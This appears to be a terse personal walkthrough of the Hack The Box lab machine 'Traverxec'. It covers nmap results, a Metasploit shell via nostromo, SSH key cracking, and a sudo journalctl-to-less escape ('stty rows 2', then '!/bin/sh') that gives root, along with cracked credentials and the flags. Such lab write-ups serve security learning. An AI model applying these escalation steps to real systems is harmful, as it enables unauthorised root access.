10.10.10.165 | traverxec | Hackthebox

nmap scan
---------
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
80/tcp open  http    nostromo 1.9.6

searched for nostromo and we have an exploit in metasploit 
got a shell using metasploit

we are logged in as www-data 
in the .htpassword file there are credentials (no use)

cd to david and found the .ssh file 
crack the ssh 
ssh into the machine as david with the id_rsa and passwd

inside the bin directory there are :
server-stats.head  
server-stats.sh

cat out the server-stats.sh
# cat server-stats.sh	
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 

checking GTFOBins for journalctl
and we have an exploit 

if the output of any commands excedes a certain lines it will go straight to less ans we can use this to get root on the machine

set the max number of output rows to 2 by :
stty rows 2

and run the command 
run the command up until the | pipe operator 
after the pipe operator the remaining command will be executed as the user and not as root

/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
!/bin/sh

and we are root 

david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/ : Nowonly4me

id_rsa:hunter

```````````````````````````````````````````
user.txt : 7db0b48469606a42cec20750d9782f3d

```````````````````````````````````````````
root.txt : 9aa36a6d76f785dfd320a478f6e0d906

```````````````````````````````````````````
